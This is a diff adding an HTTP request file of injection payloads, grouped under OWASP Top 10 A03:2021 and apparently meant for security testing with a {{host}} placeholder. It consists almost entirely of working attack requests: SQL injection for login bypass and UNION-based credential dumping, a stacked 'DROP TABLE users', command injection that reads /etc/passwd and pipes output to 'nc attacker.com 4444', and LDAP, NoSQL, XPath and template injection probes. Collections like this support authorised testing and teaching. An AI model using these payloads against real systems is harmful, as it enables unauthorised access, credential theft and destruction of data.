@@ -1,0 +1,87 @@
+# OWASP Top 10 - A03:2021 Injection
+# SQL Injection, Command Injection, LDAP, etc.
+
+### SQL Injection - Authentication bypass
+POST /login HTTP/1.1
+Host: {{host}}
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+
+username=admin' OR '1'='1&password=anything
+
+### SQL Injection - UNION SELECT
+GET /products?id=1' UNION SELECT username,password,3 FROM users-- HTTP/1.1
+Host: {{host}}
+
+### SQL Injection - Time-based blind
+GET /search?q=test' AND SLEEP(5)-- HTTP/1.1
+Host: {{host}}
+
+### SQL Injection - Boolean-based blind
+GET /user?id=1' AND 1=1-- HTTP/1.1
+Host: {{host}}
+
+### SQL Injection - Stacked queries
+POST /update HTTP/1.1
+Host: {{host}}
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+
+name=John'; DROP TABLE users; SELECT * FROM products--
+
+### Command Injection - Shell execution
+GET /ping?host=127.0.0.1; cat /etc/passwd HTTP/1.1
+Host: {{host}}
+
+### Command Injection - Backticks
+GET /ping?host=`whoami` HTTP/1.1
+Host: {{host}}
+
+### Command Injection - Subshell
+GET /ping?host=$(id) HTTP/1.1
+Host: {{host}}
+
+### Command Injection - Pipe
+GET /ping?host=127.0.0.1 | nc attacker.com 4444 HTTP/1.1
+Host: {{host}}
+
+### LDAP Injection
+POST /ldap/search HTTP/1.1
+Host: {{host}}
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+username=admin)(&(password=*))(&(a=
+
+### NoSQL Injection - MongoDB
+POST /api/login HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 62
+
+{"username": {"$ne": null}, "password": {"$ne": null}}
+
+### XML Injection
+POST /api/xml HTTP/1.1
+Host: {{host}}
+Content-Type: application/xml
+Content-Length: 89
+
+<?xml version="1.0"?>
+<user><name>admin</name><role>administrator</role></user>
+
+### XPath Injection
+GET /search?user=admin' or '1'='1 HTTP/1.1
+Host: {{host}}
+
+### Template Injection - Jinja2
+GET /hello?name={{7*7}} HTTP/1.1
+Host: {{host}}
+
+### Template Injection - Freemarker
+GET /hello?name=${7*7} HTTP/1.1
+Host: {{host}}
+
+### Template Injection - Velocity
+GET /hello?name=#set($x=7*7)$x HTTP/1.1
+Host: {{host}}
